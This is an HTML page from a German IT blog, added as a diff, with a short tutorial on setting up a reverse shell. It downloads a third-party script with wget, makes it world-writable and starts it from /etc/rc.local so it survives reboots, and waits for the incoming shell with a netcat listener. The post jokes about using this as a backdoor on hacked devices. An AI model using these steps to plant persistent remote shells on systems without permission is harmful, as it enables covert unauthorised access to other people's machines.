@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+            <title>Reverse SSH Shell - fachinformatiker.app </title>
+        <meta name="description" content="Heute mal was nützliches.Natürlich dürft ihr das nachfolgende Wissen nicht anweden, wenn ihr nicht die Erlaubnis dazu habt.Aber wer würde das denn schon tun? ;)Reverse SSH ShellIhr habt bestimmt davon schonmal gehört.Einen SSH-Revere Tunnel benötigt man um beispielsweise auf einen Rechner zuzugreifen, der hinter einem Firewallsystem steht und zwar selbst ins Internet kommt, jedoch eine sogenannte private IP-Adresse besitzt. Da man den Rechner von ausserhalb nicht erreichen kann, muss dieser von innen einen SSH-Tunnel (ggf. durch die Firewall) zu einem externen Rechner aufbauen. Bis dahin wäre das ein "normaler" SSH-Tunnel. Dieser wird aber so eingerichtet, dass er auch Verbindungen von externen Rechner nach innen zulässt.Beispielsweise Verwendungszwecke:- Testserver im Unternehmen an dem man von daheim weiterarbeiten möchte- Heimserver im Studentenwohnheim- Backdoor in gehackten Geräten (natürlich macht das keiner) ;)" />
+         
+        <meta name="generator" content="Publii Open-Source CMS for Static Site" />
+        <link rel="canonical" href="https://fachinformatiker.github.io/fachinformatiker.github.io/reverse-ssh-shell.html">
+        
+        <link rel="alternate" type="application/atom+xml" href="https://fachinformatiker.github.io/fachinformatiker.github.io/feed.xml" />
+<link rel="alternate" type="application/json" href="https://fachinformatiker.github.io/fachinformatiker.github.io/feed.json" />
+
+        <meta property="og:title" content="Reverse SSH Shell" /><meta property="og:site_name" content="fachinformatiker.app" /><meta property="og:description" content="Heute mal was nützliches.Natürlich dürft ihr das nachfolgende Wissen nicht anweden, wenn ihr nicht die Erlaubnis dazu habt.Aber wer würde das denn schon tun? ;)Reverse SSH ShellIhr habt bestimmt davon schonmal gehört.Einen SSH-Revere Tunnel benötigt man um beispielsweise auf einen Rechner zuzugreifen, der hinter einem Firewallsystem steht und zwar selbst ins Internet kommt, jedoch eine sogenannte private IP-Adresse besitzt. Da man den Rechner von ausserhalb nicht erreichen kann, muss dieser von innen einen SSH-Tunnel (ggf. durch die Firewall) zu einem externen Rechner aufbauen. Bis dahin wäre das ein 'normaler' SSH-Tunnel. Dieser wird aber so eingerichtet, dass er auch Verbindungen von externen Rechner nach innen zulässt.Beispielsweise Verwendungszwecke:- Testserver im Unternehmen an dem man von daheim weiterarbeiten möchte- Heimserver im Studentenwohnheim- Backdoor in gehackten Geräten (natürlich macht das keiner) ;)" /><meta property="og:url" content="https://fachinformatiker.github.io/fachinformatiker.github.io/reverse-ssh-shell.html" /><meta property="og:type" content="article" />
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+        <style>h1,h2,h3,h4,h5,h6,.btn,[type=button],[type=submit],button,.navbar .navbar__menu li,.navbar_mobile_sidebar .navbar__menu li,.feed__author,.post__tag,.post__share>a span,.post__nav-link>span,.footer{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"}body,h1,.h1,blockquote,.search__input,.author__name,.author__info>p,.feed__item h2,.post__nav-link{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"}</style>
+        <link rel="stylesheet" href="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/css/style.css?v=cc87cb8806c844f0646558fe70d5c5d1">
+        <script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://fachinformatiker.github.io/fachinformatiker.github.io/reverse-ssh-shell.html"},"headline":"Reverse SSH Shell","datePublished":"2019-03-09T11:58","dateModified":"2020-05-12T08:43","description":"<p>Heute mal was nützliches.<br />\nNatürlich dürft ihr das nachfolgende Wissen nicht anweden, wenn ihr nicht die Erlaubnis dazu habt.<br />\nAber wer würde das denn schon tun? ;)</p>\n<p>Reverse SSH Shell<br />\nIhr habt bestimmt davon schonmal gehört.</p>\n<p>Einen SSH-Revere Tunnel benötigt man um beispielsweise auf einen Rechner zuzugreifen, der hinter einem Firewallsystem steht und zwar selbst ins Internet kommt, jedoch eine sogenannte private IP-Adresse besitzt. Da man den Rechner von ausserhalb nicht erreichen kann, muss dieser von innen einen SSH-Tunnel (ggf. durch die Firewall) zu einem externen Rechner aufbauen. Bis dahin wäre das ein \"normaler\" SSH-Tunnel. Dieser wird aber so eingerichtet, dass er auch Verbindungen von externen Rechner nach innen zulässt.</p>\n<p>Beispielsweise Verwendungszwecke:<br />\n- Testserver im Unternehmen an dem man von daheim weiterarbeiten möchte<br />\n- Heimserver im Studentenwohnheim<br />\n- <del>Backdoor in gehackten Geräten</del> (natürlich macht das keiner) ;)</p>\n","author":{"@type":"Person","name":"Patrick Szalewicz"},"publisher":{"@type":"Organization","name":"Patrick Szalewicz"}}</script>
+            <script src="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/js/ls.parent-fit.min.js?v=f8467455ea5c88e3e51a4f212d2632bd"></script>
+            <script async src="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/js/lazysizes.min.js?v=6a69d476c93de2b78a72acb259abccea"></script>          
+        
+        
+    </head>
+    <body>
+        <div class="site-container">
+   <header class="top" id="js-header">
+      <a class="logo" href="https://fachinformatiker.github.io/fachinformatiker.github.io/">
+            fachinformatiker.app
+      </a>
+         <div class="search">
+            <div class="search__overlay js-search-overlay">
+               <div class="search__overlay-inner">
+                  <form action="https://fachinformatiker.github.io/fachinformatiker.github.io/search.html" class="search__form">
+                     <input
+                        class="search__input js-search-input"
+                        type="search"
+                        name="q"
+                        placeholder="search..."
+                        autofocus="autofocus"/>
+                  </form>
+                  <button class="search__close js-search-close" aria-label="Close">
+                     Close
+                  </button>
+               </div>
+            </div>
+            <button class="search__btn js-search-btn" aria-label="Search">
+               <svg role="presentation" focusable="false">
+                  <use xlink:href="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/svg/svg-map.svg#search"/>
+               </svg>
+            </button>
+         </div>
+   </header>
+<main>
+      <article class="post">
+         <div class="hero">
+            <header class="hero__content">
+               <div class="wrapper">
+                     <div class="post__meta">
+                        <time datetime="2019-03-09T11:58">
+                              March 9, 2019
+                        </time>
+                     </div>
+                  <h1>
+                     Reverse SSH Shell
+                  </h1>
+                     <div class="post__meta post__meta--author">
+                           <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/authors/patrick-szalewicz/" class="feed__author invert">Patrick Szalewicz</a>
+                     </div>
+               </div>
+            </header>
+         </div>
+          
+         <div class="wrapper post__entry">
+               <p>Heute mal was nützliches.<br />
+Natürlich dürft ihr das nachfolgende Wissen nicht anweden, wenn ihr nicht die Erlaubnis dazu habt.<br />
+Aber wer würde das denn schon tun? ;)</p>
+<p>Reverse SSH Shell<br />
+Ihr habt bestimmt davon schonmal gehört.</p>
+<p>Einen SSH-Revere Tunnel benötigt man um beispielsweise auf einen Rechner zuzugreifen, der hinter einem Firewallsystem steht und zwar selbst ins Internet kommt, jedoch eine sogenannte private IP-Adresse besitzt. Da man den Rechner von ausserhalb nicht erreichen kann, muss dieser von innen einen SSH-Tunnel (ggf. durch die Firewall) zu einem externen Rechner aufbauen. Bis dahin wäre das ein "normaler" SSH-Tunnel. Dieser wird aber so eingerichtet, dass er auch Verbindungen von externen Rechner nach innen zulässt.</p>
+<p>Beispielsweise Verwendungszwecke:<br />
+- Testserver im Unternehmen an dem man von daheim weiterarbeiten möchte<br />
+- Heimserver im Studentenwohnheim<br />
+- <del>Backdoor in gehackten Geräten</del> (natürlich macht das keiner) ;)</p>
+
+<p>Wie bekommen wir das aber nun aufgebaut?<br />
+Ganz einfach, man brauch nur wenige Zeilen Code in einer Linux Shell und 2 Minuten Zeit.</p>
+<p>Zuerst laden wir uns mit folgendem Befehl das Reverse Shell Script von <a href="https://github.com/PwnKitteh">PwnKitteh</a> herunter:</p>
+<blockquote><p><code>wget https://git.io/vA9FM -O RShell.sh</code></p></blockquote>
+<p>in der nun heruntergeladenen Daten passen wir die IP und den PORT an.<br />
+Die IP muss auf die IP unseres Mittelsmannes gesetzt werden.<br />
+Der Mittelsmann kann ein Linux Server sein den wir uns günstig gemietet haben, bspw. bei <a href="https://signaltransmitter.de/ref/1d9r17b0r236125ad">SignalTransmitter</a>.<br />
+Der PORT muss so gewählt werden, dass er auf unserem Server ankommt (eigene Firewall ggfs. anpassen)</p>
+<p>Das Script wird nun an einen gut merkbaren Ort (bspw. /opt) verschoben, mit Rechten bestückt und ausführbar gemacht:</p>
+<blockquote><p>mv RShell.sh /opt<br />
+chmod 777 /opt/RShell.sh<br />
+chmod +x /opt/RShell.sh</p></blockquote>
+<p>Damit das Script auch beim Neustart des Gerätes gestartet wird (und auch bei Fehlern neu gestartet wird) müssen wir es in die /etc/rc.local einfügen (über "exit 0").</p>
+<blockquote><p>bash /opt/Rshell.sh</p></blockquote>
+<p>Das Gerät können wir nun neustarten und vergessen, daran müssen wir nichts mehr machen.</p>
+<p>Nun nur noch das Lauschen auf unserem Server aktivieren und wir sind fertig und startklar:</p>
+<blockquote><p>nc -l -p PORT</p></blockquote>
+<p>nc muss installiert sein, sollte das nicht der Fall sein, dann können wir auf Ubuntu und Debian Geräten folgenden Befehl ausführen:</p>
+<blockquote><p>sudo apt install netcat</p></blockquote>
+<p>Nach spätestens 20 Sekunden haben wir auf unserem Server die Shell des entfernten Gerätes offen.<br />
+Sollten wir nicht 20 Sekunden warten wollen, dann kann die Zeit auch im RShell.sh Script angepasst werden.</p>
+<p>Und nun, viel Spaß beim Ausprobieren!</p>
+
+<p><a href="https://github.com/PwnKitteh/Payloads">Hier geht es zur GitHub Page des originalen Scripts</a>.</p>
+
+         </div>
+
+            <footer class="wrapper post__footer">
+
+                     <p class="post__last-updated">
+                        This article was updated on
+                           May 12, 2020
+                     </p>
+
+                     <ul class="post__tag">
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/linux/">Linux</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/networking/">Networking</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/projects/">Projects</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/raspberry-pi/">Raspberry Pi</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/security/">Security</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/server/">Server</a>
+                           </li>
+                           <li>
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/tutorials/">Tutorials</a>
+                           </li>
+                     </ul>
+
+                  <div class="post__share">
+                     
+                     
+                     
+                     
+                     
+                     
+                  </div>
+
+                  <div class="post__bio bio">
+                        <div class="bio__info">
+                           <h3 class="bio__name">
+                              <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/authors/patrick-szalewicz/" class="invert" rel="author">Patrick Szalewicz</a>
+                           </h3>
+
+                        </div>
+                  </div>
+            </footer>
+      </article>
+
+            <nav class="post__nav">
+               <div class="post__nav-inner">
+                     <div class="post__nav-prev">
+                        <svg width="1.041em" height="0.416em" aria-hidden="true">
+                           <use xlink:href="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/svg/svg-map.svg#arrow-prev"/>
+                        </svg>
+
+                        <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/allgemeine-geschaeftsbedingungen.html" class="invert post__nav-link" rel="prev">
+                           <span>Previous</span>
+                           Allgemeine Geschäftsbedingungen
+                        </a>
+                     </div>
+                     <div class="post__nav-next">
+                        <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/java-kurs-kostenlos.html" class="invert post__nav-link" rel="next">
+                           <span>Next</span>
+                           Java Kurs kostenlos!
+                        </a>
+                        <svg width="1.041em" height="0.416em" aria-hidden="true">
+                           <use xlink:href="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/svg/svg-map.svg#arrow-next"/>
+                        </svg>
+                     </div>
+               </div>
+            </nav>
+
+            <div class="post__related related">
+               <div class="wrapper">
+                  <h2 class="h5 related__title">
+                     You should also read:
+                  </h2>
+                     <article class="related__item">
+                        <div class="feed__meta">
+                           <time datetime="2019-12-15T20:57" class="feed__date">
+                                 December 15, 2019
+                           </time>
+                        </div>
+                        <h3 class="h1">
+                           <a href="https://fachinformatiker.github.io/fachinformatiker.github.io/reverse-ssh-tunnel-mit-autossh.html" class="invert">
+                              Reverse ssh tunnel mit autossh
+                            </a>
+                        </h3>
+                     </article>
+               </div>
+            </div>
+
+
+
+</main>
+<footer class="footer">
+        <div class="footer__copyright">
+            Powered by <a href="https://getpublii.com" target="_blank" rel="nofollow noopener">Publii Static CMS</a>
+        </div>
+       <button class="footer__bttop js-footer__bttop" aria-label="Back to top"> 
+           <svg>
+               <title>Back to top</title>
+               <use xlink:href="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/svg/svg-map.svg#toparrow" />
+           </svg>
+       </button>   
+</footer>
+</div>
+
+<script>
+   window.publiiThemeMenuConfig = {    
+        mobileMenuMode: 'sidebar',
+        animationSpeed: 300,
+        submenuWidth: 'auto',
+        doubleClickTime: 500,
+        mobileMenuExpandableSubmenus: true, 
+        relatedContainerForOverlayMenuSelector: '.top',
+   };
+</script>
+<script defer src="https://fachinformatiker.github.io/fachinformatiker.github.io/assets/js/scripts.min.js?v=205f40927e4a45297a0b266e50ad78d5"></script>
+
+<script>
+      var lazyFeaturedImage=function lazyFeaturedImage(){var b=document.querySelectorAll(".hero__image-img");for(var a=0;a<b.length;a++){var c=b[a];c.addEventListener("lazyloaded",function(f){var d=f.target.parentNode;d.classList.add("hero__image--overlay")})}};lazyFeaturedImage();
+   </script>
+
+
+</body>
+</html>
